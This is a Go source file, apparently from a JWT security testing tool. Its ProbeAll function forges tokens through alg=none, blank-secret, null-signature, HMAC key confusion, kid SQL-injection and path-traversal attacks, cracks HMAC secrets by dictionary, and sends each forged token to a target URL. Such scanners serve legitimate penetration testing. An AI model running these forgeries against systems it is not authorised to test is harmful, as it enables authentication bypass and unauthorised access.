package crack

import (
	"context"
	"fmt"
	"net/http"
	"strings"

	"github.com/cerberauth/jwtop/jwt/editor"
	"github.com/cerberauth/jwtop/jwt/exploit"
)

type ProbeResult struct {
	Name       string
	Token      string
	Status     int
	Vulnerable bool
	Err        error
	Skipped    bool
	SkipReason string
	Extra      string
}

type ProbeOptions struct {
	URL            string
	ExpectedStatus int
	PublicKeyPEM   []byte
	Candidates     []string
	Workers        int
}

// ProbeAll runs every known exploit technique against tokenString, sends each
// modified token to opts.URL as Authorization: Bearer, and returns the results.
// The second return value is the baseline HTTP status used (response for an invalid JWT).
func ProbeAll(ctx context.Context, tokenString string, opts ProbeOptions) ([]ProbeResult, int, error) {
	te, err := editor.NewTokenEditor(tokenString)
	if err != nil {
		return nil, 0, fmt.Errorf("parsing token: %w", err)
	}
	isHMAC := te.IsHMACAlg()
	isAsymmetric := isAsymmetricForHMACConfusion(te.GetToken().Method.Alg())

	// Build a corrupted-signature token used for baseline detection and the
	// no_verification probe.
	parts := strings.SplitN(tokenString, ".", 3)
	var invalidToken string
	if len(parts) == 3 {
		invalidToken = parts[0] + "." + parts[1] + ".invalidsignature"
	} else {
		invalidToken = "invalid.token.here"
	}

	// Determine the baseline: what the server returns when the JWT is invalid.
	baselineStatus := opts.ExpectedStatus
	if baselineStatus == 0 {
		// Auto-detect by sending the original token with a corrupted signature.
		baselineStatus, err = httpProbe(ctx, opts.URL, invalidToken)
		if err != nil {
			return nil, 0, fmt.Errorf("baseline probe: %w", err)
		}
	}

	probe := func(name, token, extra string) ProbeResult {
		status, err := httpProbe(ctx, opts.URL, token)
		if err != nil {
			return ProbeResult{Name: name, Extra: extra, Err: err}
		}
		return ProbeResult{Name: name, Token: token, Status: status, Extra: extra, Vulnerable: status != baselineStatus}
	}

	skip := func(name, reason string) ProbeResult {
		return ProbeResult{Name: name, Skipped: true, SkipReason: reason}
	}

	var results []ProbeResult

	// no_verification — check whether the server rejects an invalid JWT.
	// A baseline status < 400 means the server accepted the corrupted token,
	// indicating that JWT verification is not enforced.
	results = append(results, ProbeResult{
		Name:       "no_verification",
		Token:      invalidToken,
		Status:     baselineStatus,
		Vulnerable: baselineStatus < 400,
	})

	// algnone — four capitalisation variants of "none"; applies to any algorithm
	algNoneTokens, err := exploit.AlgNoneAll(tokenString)
	if err != nil {
		for _, v := range exploit.AlgNoneVariants {
			results = append(results, ProbeResult{Name: "algnone (" + v + ")", Err: err})
		}
	} else {
		for i, v := range exploit.AlgNoneVariants {
			results = append(results, probe("algnone ("+v+")", algNoneTokens[i], ""))
		}
	}

	// blanksecret — HMAC-only: re-signs with an empty secret
	if !isHMAC {
		results = append(results, skip("blanksecret", "HMAC-only exploit (token uses "+te.GetToken().Method.Alg()+")"))
	} else if t, err := exploit.BlankSecret(tokenString); err != nil {
		results = append(results, ProbeResult{Name: "blanksecret", Err: err})
	} else {
		results = append(results, probe("blanksecret", t, ""))
	}

	// nullsig — strips the signature; applies to any algorithm
	if t, err := exploit.NullSignature(tokenString); err != nil {
		results = append(results, ProbeResult{Name: "nullsig", Err: err})
	} else {
		results = append(results, probe("nullsig", t, ""))
	}

	// hmacconfusion — requires an asymmetric token (RSA/ECDSA/PSS) and a public key
	switch {
	case !isAsymmetric:
		results = append(results, skip("hmacconfusion", "asymmetric-to-HMAC exploit not applicable for "+te.GetToken().Method.Alg()))
	case len(opts.PublicKeyPEM) == 0:
		results = append(results, skip("hmacconfusion", "no public key provided"))
	default:
		if t, err := exploit.HMACConfusion(tokenString, opts.PublicKeyPEM); err != nil {
			results = append(results, ProbeResult{Name: "hmacconfusion", Err: err})
		} else {
			results = append(results, probe("hmacconfusion", t, ""))
		}
	}

	// kidinjection — manipulates the kid header; applies to any algorithm
	if t, err := exploit.KidSQLInjection(tokenString, exploit.DefaultKidSQLPayload, []byte("secret")); err != nil {
		results = append(results, ProbeResult{Name: "kidinjection (sql)", Err: err})
	} else {
		results = append(results, probe("kidinjection (sql)", t, ""))
	}

	if t, err := exploit.KidPathTraversal(tokenString, exploit.DefaultKidPathTraversalPayload, []byte("")); err != nil {
		results = append(results, ProbeResult{Name: "kidinjection (path)", Err: err})
	} else {
		results = append(results, probe("kidinjection (path)", t, ""))
	}

	// secret — HMAC-only: dictionary brute-force of the signing secret
	if !isHMAC {
		results = append(results, skip("secret", "HMAC-only exploit (token uses "+te.GetToken().Method.Alg()+")"))
	} else {
		secretResult, err := exploit.CrackSecret(tokenString, opts.Candidates, opts.Workers)
		switch {
		case err != nil:
			results = append(results, ProbeResult{Name: "secret", Err: err})
		case secretResult.Found:
			// The original token was signed with this secret; it is equivalent to
			// any token an attacker could forge once the secret is known.
			results = append(results, probe("secret", tokenString, "secret: "+secretResult.Secret))
		default:
			results = append(results, skip("secret", "not found in dictionary"))
		}
	}

	return results, baselineStatus, nil
}

// isAsymmetricForHMACConfusion reports whether alg is an RSA, ECDSA, or
// RSA-PSS algorithm that can be re-signed via HMAC confusion.
func isAsymmetricForHMACConfusion(alg string) bool {
	switch alg {
	case "RS256", "RS384", "RS512",
		"ES256", "ES384", "ES512",
		"PS256", "PS384", "PS512":
		return true
	}
	return false
}

// httpProbe sends tokenString to url as Authorization: Bearer and returns the
// HTTP response status code.
func httpProbe(ctx context.Context, url, tokenString string) (int, error) {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return 0, err
	}
	req.Header.Set("Authorization", "Bearer "+tokenString)
	resp, err := http.DefaultClient.Do(req) //nolint:gosec
	if err != nil {
		return 0, err
	}
	resp.Body.Close()
	return resp.StatusCode, nil
}
